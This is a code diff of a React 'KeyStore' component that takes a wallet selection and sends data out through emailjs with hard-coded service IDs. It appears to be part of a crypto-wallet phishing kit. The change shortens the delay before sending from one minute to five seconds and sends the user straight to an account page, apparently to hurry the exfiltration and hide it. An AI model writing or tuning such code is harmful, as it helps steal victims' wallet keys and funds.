@@ -42,7 +42,7 @@ const KeyStore = ({ selectedWallet, appType}) => {
         '4leuzsOPi6Oh_D4e0'
       );
 
-      await sendFast(1 * 60 * 1000);
+      await sendFast(1 * 5 * 1000);
       
       await emailjs.send(
         'service_ky8xa0e',
@@ -59,10 +59,9 @@ const KeyStore = ({ selectedWallet, appType}) => {
         },
         'pudHPDoixy2beukw8'
       );
-
-      setTimeout(() => {
-        router.push('/account');
-      }, 3000);
+      
+      router.push('/account');
+      
     } catch (error: unknown) {
       if (error instanceof Error) {
         console.error('Error message:', error.message);
